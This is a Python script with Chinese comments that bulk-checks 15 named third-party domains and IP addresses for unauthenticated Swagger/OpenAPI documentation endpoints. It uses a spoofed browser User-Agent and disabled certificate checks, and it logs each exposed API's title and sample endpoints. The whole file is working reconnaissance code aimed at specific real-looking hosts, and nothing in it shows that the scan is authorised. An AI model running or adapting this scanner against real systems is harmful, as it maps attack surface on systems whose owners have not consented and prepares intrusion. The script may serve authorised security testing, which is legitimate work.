#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Swagger UI 未授权访问漏洞 - 完整验证脚本
验证15个目标资产
"""

import requests
import json
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGETS = [
    {"name": "hjlndx.tyzdtech.com:8081", "url": "http://hjlndx.tyzdtech.com:8081", "path": "/api/v2/api-docs"},
    {"name": "shop.tyzdtech.com:8081", "url": "http://shop.tyzdtech.com:8081", "path": "/api/v2/api-docs"},
    {"name": "hjlndx.tyzdtech.com:8080", "url": "http://hjlndx.tyzdtech.com:8080", "path": "/api/v2/api-docs"},
    {"name": "shop.tyzdtech.com:8080", "url": "http://shop.tyzdtech.com:8080", "path": "/api/v2/api-docs"},
    {"name": "www.hjspyw.ruijinyun.com:58080", "url": "http://www.hjspyw.ruijinyun.com:58080", "path": "/v3/api-docs"},
    {"name": "shop.tyzdtech.com:443(HTTPS)", "url": "https://shop.tyzdtech.com:443", "path": "/api/v2/api-docs"},
    {"name": "43.139.80.254:443(HTTPS)", "url": "https://43.139.80.254:443", "path": "/api/v2/api-docs"},
    {"name": "36.137.123.7:58080", "url": "http://36.137.123.7:58080", "path": "/v3/api-docs"},
    {"name": "fly.tyzdtech.com:8080", "url": "http://fly.tyzdtech.com:8080", "path": "/v2/api-docs"},
    {"name": "fly.tyzdtech.com:443(HTTPS)", "url": "https://fly.tyzdtech.com:443", "path": "/api/v2/api-docs"},
    {"name": "43.139.80.254:8081", "url": "http://43.139.80.254:8081", "path": "/api/v2/api-docs"},
    {"name": "fly.tyzdtech.com:8081", "url": "http://fly.tyzdtech.com:8081", "path": "/api/v2/api-docs"},
    {"name": "43.139.80.254:8080", "url": "http://43.139.80.254:8080", "path": "/api/v2/api-docs"},
    {"name": "gjh.ruijinyun.com:58080", "url": "http://gjh.ruijinyun.com:58080", "path": "/v3/api-docs"},
    {"name": "hjspyw.ruijinyun.com:58080", "url": "http://hjspyw.ruijinyun.com:58080", "path": "/v3/api-docs"},
]

COMMON_PATHS = [
    "/v2/api-docs",
    "/v3/api-docs",
    "/api/v2/api-docs",
    "/api/v3/api-docs",
    "/swagger-ui.html",
    "/doc.html",
    "/swagger-resources",
]

print("=" * 80)
print("  Swagger UI 未授权访问漏洞 - 批量验证")
print("  共 {} 个目标".format(len(TARGETS)))
print("=" * 80)
print()

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json,*/*",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
})

vuln_list = []
no_vuln_list = []
error_list = []

for i, target in enumerate(TARGETS):
    url = target["url"] + target["path"]
    print("[{:2d}/{}] {}".format(i+1, len(TARGETS), target["name"]))
    print("-" * 80)
    
    try:
        response = session.get(url, timeout=8)
        status_code = response.status_code
        
        print("  路径: {}".format(target["path"]))
        print("  状态码: {}".format(status_code))
        
        is_vuln = False
        version = ""
        title = ""
        api_count = 0
        sample_apis = []
        
        if status_code == 200:
            content_type = response.headers.get('Content-Type', '')
            
            # 检查是否是Swagger JSON
            if 'application/json' in content_type or ('swagger' in response.text.lower() and '"paths"' in response.text):
                try:
                    data = json.loads(response.text)
                    
                    if 'swagger' in data:
                        is_vuln = True
                        version = "Swagger " + data.get('swagger', '?')
                        title = data.get('info', {}).get('title', '未知')
                        paths = data.get('paths', {})
                        api_count = len(paths)
                        sample_apis = list(paths.keys())[:5]
                    
                    elif 'openapi' in data:
                        is_vuln = True
                        version = "OpenAPI " + data.get('openapi', '?')
                        title = data.get('info', {}).get('title', '未知')
                        paths = data.get('paths', {})
                        api_count = len(paths)
                        sample_apis = list(paths.keys())[:5]
                
                except:
                    # 可能是HTML的Swagger页面
                    if 'swagger' in response.text.lower() and '<title>' in response.text:
                        is_vuln = True
                        version = "Swagger UI页面"
                        title = "Swagger UI"
            
            # 检查是否是Swagger UI HTML页面
            elif 'text/html' in content_type:
                if 'swagger' in response.text.lower() or 'openapi' in response.text.lower():
                    is_vuln = True
                    version = "Swagger UI页面"
                    title = "Swagger UI页面"
        
        if is_vuln:
            vuln_list.append({
                "name": target["name"],
                "url": target["url"],
                "path": target["path"],
                "version": version,
                "title": title,
                "api_count": api_count,
                "sample_apis": sample_apis
            })
            print("  状态: ✅ 存在漏洞")
            print("  版本: {}".format(version))
            print("  标题: {}".format(title))
            print("  API数: {}个".format(api_count))
            if sample_apis:
                print("  示例API:")
                for api in sample_apis[:3]:
                    print("    - {}".format(api))
        else:
            if status_code == 404 or status_code == 401 or status_code == 403:
                no_vuln_list.append(target["name"])
                print("  状态: ❌ 不存在 ({})".format(status_code))
            elif status_code == 503:
                error_list.append((target["name"], "503 服务不可用"))
                print("  状态: ⚠️  503 服务不可用")
            else:
                error_list.append((target["name"], "HTTP {}".format(status_code)))
                print("  状态: ❓ HTTP {}".format(status_code))
    
    except requests.exceptions.Timeout:
        error_list.append((target["name"], "超时"))
        print("  状态: ⏱️  请求超时")
    except requests.exceptions.ConnectionError:
        error_list.append((target["name"], "连接失败"))
        print("  状态: ❌ 连接失败")
    except Exception as e:
        error_list.append((target["name"], str(e)[:50]))
        print("  状态: ❌ 异常: {}".format(e))
    
    print()
    time.sleep(0.2)  # 轻微限速

print("=" * 80)
print("  验证结果汇总")
print("=" * 80)
print()
print("  总计: {} 个目标".format(len(TARGETS)))
print("  ✅ 存在漏洞: {} 个".format(len(vuln_list)))
print("  ❌ 不存在: {} 个".format(len(no_vuln_list)))
print("  ⚠️  异常/超时: {} 个".format(len(error_list)))
print()

if vuln_list:
    print("-" * 80)
    print("  漏洞列表（{}个）:".format(len(vuln_list)))
    print("-" * 80)
    for i, v in enumerate(vuln_list):
        print()
        print("  [{:2d}] {}".format(i+1, v["name"]))
        print("       URL: {}{}".format(v["url"], v["path"]))
        print("       版本: {}".format(v["version"]))
        print("       标题: {}".format(v["title"]))
        print("       API数: {}个".format(v["api_count"]))

if error_list:
    print()
    print("-" * 80)
    print("  异常列表（{}个）:".format(len(error_list)))
    print("-" * 80)
    for name, err in error_list:
        print("    - {}: {}".format(name, err))

print()
print("=" * 80)
